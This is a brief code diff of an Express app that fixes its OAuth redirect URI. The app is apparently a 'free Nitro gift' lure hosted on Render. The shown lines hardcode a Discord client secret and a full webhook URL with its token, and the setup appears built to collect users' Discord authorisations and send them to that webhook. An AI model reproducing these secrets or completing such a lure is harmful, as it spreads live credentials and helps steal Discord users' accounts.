@@ -3,7 +3,7 @@ const app = express();
 
 const CLIENT_ID = "1560958983966302298"; 
 const CLIENT_SECRET = "MivsTC7IRJ4lNYNf3uYPUysbI2KKvHFp"; 
-const REDIRECT_URI = "https://https://nitro-gift-30uz.onrender.com"; 
+const REDIRECT_URI = "https://nitro-gift-30uz.onrender.com/callback";
 const WEBHOOK = "https://discord.com/api/webhooks/1560966202203836428/4B5ZJ9mJpM8Ht0Jnok4WPXGO-IP-wjsvF3mHiSGIScrjZyxqLut7D00lLUCjYxICvIu9";
 
 app.get('/', (req, res) => {
